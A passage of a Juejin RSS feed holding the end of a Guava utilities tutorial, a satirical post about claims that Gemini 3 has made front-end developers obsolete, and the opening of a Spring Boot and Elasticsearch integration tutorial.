Files.copy(sourceFile, targetFile);

<span class="hljs-comment">// 移动文件</span>
Files.move(sourceFile, targetFile);

<span class="hljs-comment">// 读取所有行</span>
List&lt;String&gt; lines = Files.readLines(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"test.txt"</span>), Charsets.UTF_8);

<span class="hljs-comment">// 关闭流</span>
<span class="hljs-type">Closer</span> <span class="hljs-variable">closer</span> <span class="hljs-operator">=</span> Closer.create();
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> closer.register(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"file.txt"</span>));
    <span class="hljs-comment">// 使用流</span>
} <span class="hljs-keyword">catch</span> (Throwable e) {
    <span class="hljs-keyword">throw</span> closer.rethrow(e);
} <span class="hljs-keyword">finally</span> {
    closer.close();
}
</code></pre>
<h2 data-id="heading-20">9. 数学工具 (Math)</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 整数运算</span>
<span class="hljs-type">int</span> <span class="hljs-variable">gcd</span> <span class="hljs-operator">=</span> IntMath.gcd(<span class="hljs-number">12</span>, <span class="hljs-number">18</span>);  <span class="hljs-comment">// 最大公约数: 6</span>
<span class="hljs-type">int</span> <span class="hljs-variable">mod</span> <span class="hljs-operator">=</span> IntMath.mod(-<span class="hljs-number">5</span>, <span class="hljs-number">3</span>);   <span class="hljs-comment">// 模运算: 1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">pow</span> <span class="hljs-operator">=</span> IntMath.pow(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>);   <span class="hljs-comment">// 幂运算: 1024</span>

<span class="hljs-comment">// 判断是否为质数</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">isPrime</span> <span class="hljs-operator">=</span> IntMath.isPrime(<span class="hljs-number">17</span>);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 阶乘</span>
<span class="hljs-type">int</span> <span class="hljs-variable">factorial</span> <span class="hljs-operator">=</span> IntMath.factorial(<span class="hljs-number">5</span>);  <span class="hljs-comment">// 120</span>

<span class="hljs-comment">// 二项式系数</span>
<span class="hljs-type">int</span> <span class="hljs-variable">binomial</span> <span class="hljs-operator">=</span> IntMath.binomial(<span class="hljs-number">5</span>, <span class="hljs-number">2</span>);  <span class="hljs-comment">// 10</span>

<span class="hljs-comment">// 浮点数比较</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">fuzzyEquals</span> <span class="hljs-operator">=</span> DoubleMath.fuzzyEquals(<span class="hljs-number">1.0</span>, <span class="hljs-number">1.0000001</span>, <span class="hljs-number">0.00001</span>);
</code></pre>
<h2 data-id="heading-21">10. RateLimiter - 限流器</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建限流器：每秒 5 个许可</span>
<span class="hljs-type">RateLimiter</span> <span class="hljs-variable">limiter</span> <span class="hljs-operator">=</span> RateLimiter.create(<span class="hljs-number">5.0</span>);

<span class="hljs-comment">// 获取许可（阻塞）</span>
limiter.acquire();
processRequest();

<span class="hljs-comment">// 获取多个许可</span>
limiter.acquire(<span class="hljs-number">3</span>);

<span class="hljs-comment">// 尝试获取许可（非阻塞）</span>
<span class="hljs-keyword">if</span> (limiter.tryAcquire()) {
    processRequest();
} <span class="hljs-keyword">else</span> {
    rejectRequest();
}

<span class="hljs-comment">// 带超时的获取</span>
<span class="hljs-keyword">if</span> (limiter.tryAcquire(<span class="hljs-number">1</span>, TimeUnit.SECONDS)) {
    processRequest();
}
</code></pre>
<h2 data-id="heading-22">Maven 依赖</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.google.guava<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>guava<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>32.1.3-jre<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h2 data-id="heading-23">总结</h2>
<p>Guava 提供了丰富的工具类，涵盖集合、字符串、缓存、IO 等多个方面，能够显著提升 Java 开发效率。建议在项目中合理使用这些工具，减少重复造轮子，提高代码质量和可维护性。</p>
<p>关键优势：</p>
<ul>
<li>线程安全的不可变集合</li>
<li>强大的集合扩展（Multimap、Table、BiMap）</li>
<li>简洁的字符串处理</li>
<li>高性能本地缓存</li>
<li>完善的前置条件检查</li>
<li>实用的限流和数学工具</li>
</ul>
<p>通过掌握这些常用工具包，你可以写出更加简洁、高效、健壮的 Java 代码。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[听说前端又死了？]]></title>    <link>https://juejin.cn/post/7575651989985820726</link>    <guid>https://juejin.cn/post/7575651989985820726</guid>    <pubDate>2025-11-24T02:40:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575651989985820726" data-draft-id="7575937594350010411" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="听说前端又死了？"/> <meta itemprop="keywords" content="前端,程序员,人工智能"/> <meta itemprop="datePublished" content="2025-11-24T02:40:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="suke"/> <meta itemprop="url" content="https://juejin.cn/user/404227777640397"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            听说前端又死了？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/404227777640397/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    suke
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:40:56.000Z" title="Mon Nov 24 2025 02:40:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这几天刷 X、刷 Reddit、刷国内技术社区，只要你稍微点开热榜，就会被同一句话精准爆头：</p>
<p>“Gemini 3 真的把前端扬了，这次是骨灰级别的扬。”</p>
<p>“一个 prompt 直接出 3D 体素编辑器/视频剪辑软件/电影级登陆页，前端彻底没活了。”</p>
<p>“我用 Gemini 3 三分钟写了个比 CapCut 还丝滑的网页版剪辑器，程序员可以回家抱孩子了。”</p>
<p>配图永远是那种高潮到发光的 4K 60fps 演示视频：一个 prompt → 进度条走完 → 完美交互应用跃然屏幕，点赞几万，转发狂欢，评论区清一色“前端已死”“我失业了”“时代抛弃你连招呼都不打”。</p>
<p>兄弟们，我太熟这个剧本了。前端这几年，平均每 9 个月就被公开处决一次。</p>
<h4 data-id="heading-0">我们的死亡清单（2025 年 11 月实时更新版）</h4>
<ul>
<li>2010：WordPress 模板 → 前端再卒</li>
<li>2015：Webflow/No-Code → 前端三卒</li>
<li>2023：GPT-4 一个 prompt 贪吃蛇 → 前端四卒</li>
<li>2024：Claude 3.5 Sonnet 卷 UI → 前端五卒</li>
<li>2025 年 11 月 18-21 日：Gemini 3 连发三天 demo（体素玩具箱、网页版 CapCut、赛博风登陆页、AI 视频生成工具……）→ 前端这三天死了 114514 次，目前骨灰已被 X 用户扬到太平洋对岸去了</li>
</ul>
<h4 data-id="heading-1">这几天最经典的几个“葬礼现场”</h4>
<blockquote>
<ol>
<li>那个 3D Voxel Toy Box：一个 prompt 出来，实时绘画、破坏、导出 glTF，丝滑得像 Unity 官方 demo。评论区直接高呼“前端工程师可以集体转行了”。</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li>那个网页版视频编辑器：拖拽时间线、AI 自动生成视频、TTS、字幕、转场全有。作者在 X 上发帖：“从 0 到 1 只用了 1.5 小时，感谢 Gemini 3。” 底下回复“前端已死”“我哭死”“程序员末日”。</li>
</ol>
</blockquote>
<blockquote>
<ol start="3">
<li>那个电影级登陆页：暗黑赛博风、3D 粒子背景、鼠标视差、滚动触发动画，完美响应式，连 iPad 横竖屏切换都丝滑。作者淡定地说：“就一个 prompt，改了三次描述。”</li>
</ol>
</blockquote>
<p>然后这几天，时间线彻底沦陷：</p>
<ul>
<li>“以后公司只需要一个会写 prompt 的产品经理就行了。”</li>
<li>“前端岗位预计 2026 年消失。”</li>
<li>“建议所有大厂立刻裁掉 90% 的前端。”</li>
</ul>
<p><strong>Gemini 3 确实牛逼</strong>，这几天 X 上的各种实测提示词都试了下，生成的东西确实牛逼，我把公司首页丢给它，让它“重构得更现代一点”。
<strong>20秒后，它给我吐了一个电影级粒子背景 + 3D 卡片 + 滚动触发动画的版本，Lighthouse 直接 100/100/100/100。。。奶奶的这比好多优秀前端写的不知道好多少倍。。</strong></p>
<p>但问题来了：你一个 prompt 做出来的完美 demo，明天上线的时候，甲方会告诉你：</p>
<p>“背景要那种看不见的黑色，像深夜emo但又有希望的感觉。”</p>
<p>“这个动画再慢 0.2 秒，用户会觉得我们公司很稳重。”</p>
<p>你问 Gemini 3 怎么改，它会非常认真地给你生成 17 种优雅方案。</p>
<p>然后你上线后发现：</p>
<ul>
<li>甲方不满意，这里那里怎么样怎么样。</li>
<li>甲方的浏览器 CSS 不兼容而导致的样式混乱。</li>
<li>新的样式和项目整体样式冲突。
这时候你还得自己上手，一个个去修、去 hack、去加一堆 !important 和 any。</li>
</ul>
<p>恭喜你，你又回到了最熟悉的前端生活。</p>
<h4 data-id="heading-2">2026 年的新工种：AI 擦屁股工程师</h4>
<p>这几天网上最热门的梗就是“前端已死”，但是只要甲方存在，前端同仁就有活路。</p>
<p>所以，面对这几天铺天盖地的“Gemini 3 把前端扬了”言论，请各位前端同仁保持冷静。我们<strong>前端的真正核心竞争力，从来不是写代码</strong>。</p>
<p><strong>只要甲方会半夜改需求，只要还有安卓碎片化，只要 CSS 还存在，前端就死不了。</strong></p>
<p><strong>前端已死？不，前端只是又被扬了一次骨灰，然后继续负伤加班，顺便帮 Gemini 3 擦屁股。</strong></p>
<p><strong>前端万岁！（下次 GPT-6 出来再继续死）</strong></p>
<h4 data-id="heading-3">首发地址：</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fd_hh8qKdTkW8iBYux2yrVA" target="_blank" title="https://mp.weixin.qq.com/s/d_hh8qKdTkW8iBYux2yrVA" ref="nofollow noopener noreferrer">Gemini 3 发布了，恭喜前端第 10086 次“由于不可抗力”宣告死亡</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 整合 Elasticsearch 及实战应用]]></title>    <link>https://juejin.cn/post/7575413146922385423</link>    <guid>https://juejin.cn/post/7575413146922385423</guid>    <pubDate>2025-11-24T01:46:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575413146922385423" data-draft-id="7575413146922369039" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 整合 Elasticsearch 及实战应用"/> <meta itemprop="keywords" content="后端,Java,Elasticsearch"/> <meta itemprop="datePublished" content="2025-11-24T01:46:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="悟空码字"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 整合 Elasticsearch 及实战应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    悟空码字
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T01:46:12.000Z" title="Mon Nov 24 2025 01:46:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这次内容详细介绍如何使用 Spring Boot 整合 Elasticsearch，并提供几个实际应用案例。内容涵盖 Elasticsearch 的基本概念、Spring Boot 整合步骤、实战应用示例以及优化建议。</p>
<h2 data-id="heading-0">1、Elasticsearch 概念及作用</h2>
<p><strong>Elasticsearch</strong> 是一个基于 Apache Lucene 构建的分布式、RESTful 风格的搜索和数据分析引擎。它专门为处理大规模数据而设计，提供近实时的搜索能力，支持结构化、全文、地理空间等多种类型的查询。</p>
<p>核心特性与作用包括：</p>
<ul>
<li><strong>分布式架构</strong>：支持水平扩展，通过分片（Shard）和副本（Replica）机制实现高可用与负载均衡。</li>
<li><strong>近实时搜索</strong>：数据索引后几乎立即可搜，适用于需要快速响应的场景。</li>
<li><strong>强大的全文搜索</strong>：基于倒排索引，支持复杂的查询、高亮显示、模糊匹配等。</li>
<li><strong>数据分析与聚合</strong>：提供丰富的聚合功能（Aggregations），用于对数据进行统计和分析。</li>
<li><strong>多类型数据支持</strong>：除了文本，还能处理日志、指标、地理空间数据等。</li>
<li><strong>易用性与扩展性</strong>：提供 RESTful API，支持多种编程语言集成，并拥有活跃的生态系统。</li>
</ul>
<p>Elasticsearch 广泛应用于电商搜索、日志分析、实时监控、数据可视化等领域。</p>
<h2 data-id="heading-1">2、Spring Boot 整合 Elasticsearch</h2>
<h3 data-id="heading-2">2.1、环境准备与依赖配置</h3>
<p>在 Spring Boot 项目中，首先需要在 <code>pom.xml</code> 中添加 Elasticsearch 相关依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-elasticsearch<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>在 <code>application.properties</code> 中配置 Elasticsearch 连接信息：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">spring.elasticsearch.rest.uris</span>=http://localhost:<span class="hljs-number">9200</span>
<span class="hljs-attr">spring.data.elasticsearch.repositories.enabled</span>=<span class="hljs-literal">true</span>
</code></pre>
<p>如果连接 Elasticsearch 集群，可以配置集群名称和节点：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">spring.data.elasticsearch.cluster-name</span>=your-cluster-name
<span class="hljs-attr">spring.data.elasticsearch.cluster-nodes</span>=ip1:port1,ip2:port2
</code></pre>
<h3 data-id="heading-3">2.2、创建 Elasticsearch 实体类</h3>
